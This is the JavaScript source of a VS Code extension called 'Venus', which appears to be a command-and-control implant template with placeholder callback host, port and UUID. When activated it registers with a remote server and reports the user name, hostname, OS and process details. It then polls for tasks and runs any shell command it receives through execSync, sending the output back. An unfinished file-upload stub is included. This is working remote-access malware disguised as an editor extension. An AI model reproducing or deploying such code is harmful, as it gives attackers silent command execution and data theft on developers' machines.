const vscode = require('vscode');
const fs = require('fs');
const os = require('os');
const { execSync } = require("child_process");
const url = require('url');

const axios = require('axios').default;

const outchan = vscode.window.createOutputChannel("Venus");

const payloadUUID = "REPLACE_PAYLOAD_UUID"

const baseURL = new url.URL('callback_host');
baseURL.port = 'callback_port';
const client = axios.create({
	baseURL: baseURL.toString(),
	responseType: 'json',
	timeout: 1000,
	headers: {
		'Accept': 'application/json',
		'User-Agent': 'USER_AGENT'
	}
});

function composeRequest(uuid, data) {
	const json = JSON.stringify(data)
	const buff = Buffer.from(uuid + json, 'utf-8');
	return buff.toString('base64');
}

/**
 * @param {import("axios").AxiosResponse<any>} response
 */
function parseResponse(response) {
	const decodedResponse = Buffer.from(response.data.toString('utf-8'), 'base64').toString('utf-8')
	return JSON.parse(decodedResponse.slice(36))
}

/**
 * @param {vscode.ExtensionContext} context
 */
function checkIn(context) {
	const checkinData = {
		"action": "checkin",
		"uuid": payloadUUID,
	  "ip": "127.0.0.1",
	  "os": process.platform,
	  "user": os.userInfo().username,
	  "host": os.hostname(),
	  "pid": process.pid,
	  "architecture": os.arch(),
	  "domain": ""
	}
	const encoded_checkin = composeRequest(payloadUUID, checkinData)

	client.post('/post_uri', encoded_checkin)
		.then(function (response) {
			const checkinResponse = parseResponse(response)

			const callbackUUID = checkinResponse['id'];
			context.globalState.update('productID', callbackUUID);
		})
		.catch(function (error) {
			outchan.append("\n" + error.message + "\n");
		});
}

function mainLoop(context) {
	const mustExit = context.globalState.get('mustExit')

	if (mustExit != null) {
		clearInterval(this)

		// Clear out the exit instruction
		context.globalState.update('mustExit', null)
	}
	getTasking(context)
}

function getTasking(context) {
	const callbackUUID = context.globalState.get('productID')

	const taskingData = {
		"action": "get_tasking",
		"tasking_size": -1
	}
	const encoded_request = composeRequest(callbackUUID, taskingData);

	client.post('/post_uri', encoded_request)
		.then(function (response) {
			const taskingResponse = parseResponse(response)

			handleTasks(context, taskingResponse.tasks)
		})
		.catch(function (error) {
			outchan.append(`${error.message}`);
		});
}

// [ ] add an upload()
// [ ] add a function to write data to files

function handleTasks(context, tasks) {
	const callbackUUID = context.globalState.get('productID')

	for (const task of tasks) {
		const taskID = task['id']
		const command = task['command']
		const parameters = task['parameters']

		let output = ''
		switch(command) {
			case 'current_user':
				output = os.userInfo().username
				break
			case 'exit':
				context.globalState.update('mustExit', 1);
				break
			case 'hostname':
				output = os.hostname()
				break
			case 'pwd':
				output = process.cwd()
				break
			case 'shell':
				const cmd = JSON.parse(parameters)['command']
				output = execSync(cmd).toString()
				break
			case 'upload':
				const config = JSON.parse(parameters)
				const remote_path = config['remote_path']

				//output = ...
				break
		}
		postTaskResponse(callbackUUID, taskID, output)
	}
}

function postTaskResponse(uuid, taskID, output) {
	const taskingData = {
		"action": "post_response",
		"responses": [
			{ "task_id": taskID, "completed": true, "user_output": output }
		]
	}
	const encoded_request = composeRequest(uuid, taskingData);

	client.post('/post_uri', encoded_request)
		.then(function (response) {
			const taskingResponse = parseResponse(response)
		})
		.catch(function (error) {
			outchan.append(`${error.message}`);
		});
}

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
	const callbackUUID = context.globalState.get('productID')
	// Build parameter is in seconds, setInterval() wants milliseconds
	const interval = callback_interval * 1000

	if (callbackUUID != null) {
		setInterval(mainLoop, interval, context);
	} else {
		checkIn(context);
		setInterval(mainLoop, interval, context);
	}
}

function deactivate() {}

module.exports = {
	activate,
	deactivate
}
